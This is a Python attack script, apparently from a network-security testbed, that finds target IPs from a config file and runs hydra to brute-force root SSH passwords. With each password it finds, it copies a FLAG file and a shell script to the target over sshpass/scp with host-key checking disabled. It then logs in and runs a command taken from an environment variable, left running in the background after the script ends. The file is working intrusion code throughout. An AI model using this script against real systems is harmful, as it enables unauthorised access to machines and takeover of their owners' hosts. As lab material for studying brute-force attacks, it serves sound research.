import subprocess
import os
import json

import argparse

def main():
  # Load argparse
  parser = argparse.ArgumentParser(description='Run hydra to crack SSH passwords')
  # Add nodeactor name target of the attack
  parser.add_argument(
    'nodeactor_target_list',
    metavar='nodeactor_target',
    type=str,
    nargs='+',
    help='Nodeactor target of the attack')
  # Example of usage: python3 attacker.py nodeactor1 nodeactor2 nodeactor3

  parser.add_argument("--skip_hydra", action="store_true", help="Skip hydra and just copy the FLAG file")

  args = parser.parse_args()

  skip_hydra = args.skip_hydra
  nodeactor_target_list = args.nodeactor_target_list
  # Set the log file name
  log_hydra_fname = 'log_hydra.txt'
  # Other examples that could be uncommented
  # log_hydra_fname = 'example_log_hydra.txt'
  # log_hydra_fname = 'example_log_hydra_with_err.txt'

  # Get the target IP from the command line arguments

  # load IP_LIST_DATA from /MENTORED_IP_LIST.json
  with open('/MENTORED_IP_LIST.json', 'r') as f:
    IP_LIST_DATA = json.load(f)
  
  exp_iface = os.environ.get('MENTORED_EXP_IFNAME', 'net1')
  vulnerable_ips = []
  for nodeactor_name, nodeactor_data in IP_LIST_DATA.items():
    if nodeactor_name not in nodeactor_target_list:
      continue
    for pod in nodeactor_data:
      # find the ip address related to exp_iface
      is_exp_iface = [x[2]==exp_iface for x in pod]
      # find index in is_exp_iface that is True
      idx = is_exp_iface.index(True)
      ip = pod[idx][0]
      vulnerable_ips.append(ip)

  print(vulnerable_ips)

  # Load PASSW_LIST from env
  if 'PASSW_LIST' in os.environ:
    password_list = os.environ['PASSW_LIST']
  else:
    password_list = '10000_common_passwords'

  if "ATTACK_CMD" in os.environ:
    command = os.environ["ATTACK_CMD"]
  else:
    command = 'touch /FLAG'

  # Command should keep alive even after the script is finished
  file_attack_content = f'#!/bin/bash\n\n'
  file_attack_content += f'{command} &\n'
  file_attack_content += f'disown %1\n'

  with open('file_attack_cmd.sh', 'w') as file_attack:
    file_attack.write(file_attack_content)

  subprocesses = []

  found_pwd = {}
  for target_ip in vulnerable_ips:
    if not skip_hydra:
      print(f'Starting hydra for {target_ip}')
      # Run os command
      os.system(f'mentored-registry-action --source_ports 22 --destination_ports 22 -a attack-sshbruteforce -o /app/results/ -n "Starting bruteforce ssh attack" -t {target_ip}')
      # Run hydra and redirect output to the log file
      with open(log_hydra_fname, 'w') as log_file:
        subprocess.run(['hydra', '-l', 'root', '-P', password_list, '-s', '22', '-f', target_ip, 'ssh'], 
              stdout=log_file, stderr=subprocess.STDOUT)

      os.system(f'mentored-registry-action --source_ports 22 --destination_ports 22 -a attack-stop-sshbruteforce -o /app/results/ -n "Stopping bruteforce ssh attack" -t {target_ip}')
      print(f'Finished hydra for {target_ip}')

    # Check for errors in the log file
    with open(log_hydra_fname, 'r') as log_file:
      log_contents = log_file.read()
      if 'ERROR' not in log_contents:
        print(f'No errors in {log_hydra_fname}')

        # Extract password from the log file
        ssh_password = None
        for line in log_contents.splitlines():
          if 'password:' in line:
            ssh_password = line.split('password:')[1].strip()
            break

        if ssh_password:
          # Write the password to a file called FLAG
          with open('FLAG', 'w') as flag_file:
            flag_file.write(ssh_password)

          print(f'Found password for {target_ip}: {ssh_password}') 
          found_pwd[target_ip] = ssh_password

          # Use sshpass to copy the FLAG file to the target server
          subprocess.run([
            'sshpass',
            '-p',
            ssh_password,
            'scp',
            '-o',
            'StrictHostKeyChecking=no',
            'FLAG',
            f'root@{target_ip}:/FLAG'])

          subprocess.run([
            'sshpass',
            '-p',
            ssh_password,
            'scp',
            '-o',
            'StrictHostKeyChecking=no',
            'file_attack_cmd.sh',
            f'root@{target_ip}:/file_attack_cmd.sh'])

  for target_ip, ssh_password in found_pwd.items():
          subprocesses.append(subprocess.Popen([
              'sshpass',
              '-p',
              ssh_password,
              'ssh',
              '-o',
              'StrictHostKeyChecking=no',
              f'root@{target_ip}',
              "bash /file_attack_cmd.sh"],
              stdout=subprocess.PIPE,
              stderr=subprocess.STDOUT,
              stdin=subprocess.DEVNULL))

  # Wait for all subprocesses to finish
  for ip, process in zip(found_pwd.keys(), subprocesses):
    print(f"Waiting for process in {ip} to finish")
    process.wait()
    print(f"Process in {ip} finished")
    print(f"Output:")
    print(process.stdout.read().decode('utf-8'))


  print("All processes finished")

if __name__ == '__main__':
  main()
